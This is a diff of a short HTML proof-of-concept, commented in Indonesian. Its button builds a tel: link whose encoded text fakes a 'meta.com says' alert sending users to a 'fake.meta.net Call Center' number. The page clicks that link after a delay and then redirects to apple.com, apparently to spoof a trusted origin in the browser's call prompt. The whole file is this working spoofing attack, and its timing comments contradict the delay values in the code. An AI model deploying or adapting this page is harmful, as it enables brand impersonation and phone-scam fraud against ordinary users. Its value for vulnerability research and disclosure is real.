@@ -1,20 +1,22 @@
 <!DOCTYPE html>
 <html>
   <body>
+    <!-- Button yang memicu fungsi bb() saat diklik -->
     <button onclick="bb()">Click Here</button>
 
     <script>
       function bb() {
-        // Delay 5 detik sebelum trigger tel:
+        // Membuat elemen link untuk telepon
+        var link = document.createElement('a');
+        link.href = 'tel:meta.com says:%0a%0dMetaDown!%0aGo%20to%20fake.meta.net%20Call%20Center%0a%0dCall:0987-65432';
+        
+        // Menunda eksekusi selama 5 detik sebelum mengeksekusi link.click()
         setTimeout(function() {
-          // Trigger panggilan telepon
-          window.location.href = 'tel:+12125551234';
+          link.click(); // Simulasikan klik untuk tel:
 
-          // Redirect ke halaman lain setelah itu
-          setTimeout(function() {
-            window.location = 'https://www.apple.com/contact/';
-          }, 2500); // 5 detik setelah tel:
-        }, 1900); // 5 detik setelah klik
+          // Redirect ke halaman lain setelah 5 detik
+          window.location = 'https://www.apple.com';  // Redirect ke halaman Apple setelah eksekusi
+        }, 3000); // Delay 5 detik (5000 ms)
       }
     </script>
   </body>
